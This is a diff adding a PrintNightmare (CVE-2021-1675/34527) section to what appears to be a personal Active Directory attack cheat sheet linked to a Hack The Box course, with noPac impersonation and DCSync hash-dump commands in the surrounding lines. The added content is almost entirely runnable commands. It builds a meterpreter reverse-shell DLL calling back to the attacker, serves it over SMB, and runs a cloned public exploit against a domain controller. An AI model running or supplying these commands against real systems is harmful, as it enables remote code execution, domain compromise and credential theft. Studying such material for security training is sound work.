@@ -413,6 +413,32 @@ $ python3 $DEST/scanner.py domain/username:password -dc-ip IP -use-ldap # Test, 
 $ python3 $DEST/noPac.py domain/username:password -dc-ip IP -dc-host DC01 -shell --impersonate administrator -use-ldap # impersonate DC01
 $ python3 $DEST/noPac.py domain/username:password -dc-ip IP -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user domain/administrator # DCSync, Dump Hashes/Tickets
 ```
+
+<br>
+
+#### PrintNightmare
+
+[![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
+
+The PrintNightmare vulnerability is based on [CVE-2021-1675](https://nvd.nist.gov/vuln/detail/CVE-2021-1675) and [CVE-2021-34527](https://nvd.nist.gov/vuln/detail/CVE-2021-34527). Both are targeting the Print Spooler service.
+
+```shell!
+$ impacket-rpcdump @DCIP | egrep 'MS-RPRN|MS-PAR' # POC? 
+Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
+Protocol: [MS-RPRN]: Print System Remote Protocol
+```
+
+```shell!
+$ # start a handler on port 4444 to catch:
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f dll -o shell.dll
+$ impacket-smbserver -smb2support share .
+```
+
+```shell!
+$ DEST="$HOME/tools/PrintNightmare"
+$ git clone -b "main" https://github.com/cube0x0/CVE-2021-1675.git $DEST
+$ python3 $DEST/CVE-2021-1675.py domain/username:password@IP '\\HOST_IP\share\shell.dll'
+```
 </div><div>
 </div></div>
 
